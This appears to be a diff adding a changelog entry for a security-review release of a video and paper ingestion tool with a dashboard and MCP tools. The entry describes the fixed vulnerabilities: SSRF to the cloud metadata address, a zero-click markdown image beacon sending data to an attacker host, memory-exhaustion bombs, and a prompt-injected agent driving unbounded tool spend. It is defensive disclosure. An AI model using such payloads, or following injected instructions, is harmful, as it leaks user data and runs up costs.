@@ -14,6 +14,18 @@ and this project adheres to [Semantic Versioning](https://semver.org/).
 - Goal-file refresh hook for `distill watch`: re-run discover against a saved goal file on a schedule so goal-driven topics stay current the same way keyword topics do.
 - Discovery-loop hardening (rerank determinism, rigor knob, real cost estimator, preview-as-primary UX, synthesis register styles). See ROADMAP section 12.
 
+## 0.9.21 - 2026-06-06
+
+**Second security review (DoS, prompt-injection, MCP exposure, file-handling). This release fixes the concrete exploitable issues; the LLM-trust-boundary prompt hardening follows in 0.9.22.**
+
+- **SSRF via yt-dlp (High).** `process_video_url` / `watch_add` / `catch_up` passed video/channel URLs straight into yt-dlp, which does its own networking and so bypassed the SSRF guards on the urllib/requests paths -- an attacker URL (`http://169.254.169.254/...`, an internal host) could be fetched. URLs handed to yt-dlp are pinned to YouTube hosts now (`is_youtube_url`), at `get_video_info`, `resolve_channel_name`, and the transcript download.
+- **Dashboard exfiltration beacon (High).** Ingested content rendered in the dashboard could carry a markdown image (`![](http://attacker/leak?d=...)`) that survived nh3 and auto-loaded on page view -- a zero-click beacon. The markdown filter drops `<img>`, restricts link schemes to http/https/mailto, and marks links `noopener noreferrer nofollow`; responses also carry a restrictive `Content-Security-Policy` (img-src/default-src 'self') and `Referrer-Policy: no-referrer`.
+- **Unbounded local-file ingest (High, DoS).** `ingest` read the whole file into memory before the char cap, and the PDF path walked every page -- a 10 GB file or page-bomb could OOM the process. There's a 25 MB size pre-check, a bounded read (covers FIFO/proc/symlink), and a 50-page PDF cap now (mirroring the arXiv extractor).
+- **Unbounded MCP tool spend (Medium, DoS).** The `learn_topic` / `search_videos` / `discover` / `papers` MCP tools had no ceiling on `limit`, so a prompt-injected agent could pass `limit=100000` and drive unbounded transcript downloads + LLM calls. Each is clamped to 25 (matching `site_batch`'s bounded-cost discipline).
+- **Syndication decompression bomb (Medium, DoS).** The X syndication fetch used httpx (which auto-decompresses) plus an uncapped `resp.json()`, so a gzip/br bomb from a hostile/compromised endpoint could exhaust memory. The body is streamed and capped at 5 MB of decompressed bytes now.
+
+Confirmed clean or accepted (local-trust): the subprocess/deserialization/secret/ReDoS surface (re-verified), MCP path containment, and the file-handling symlink findings (which require a local attacker with write access to the library -- `_atomic_write` durability/temp hardening is tracked for 0.9.22).
+
 ## 0.9.20 - 2026-06-06
 
 **Closed the DNS-rebinding residual documented in the 0.9.19 security pass.**
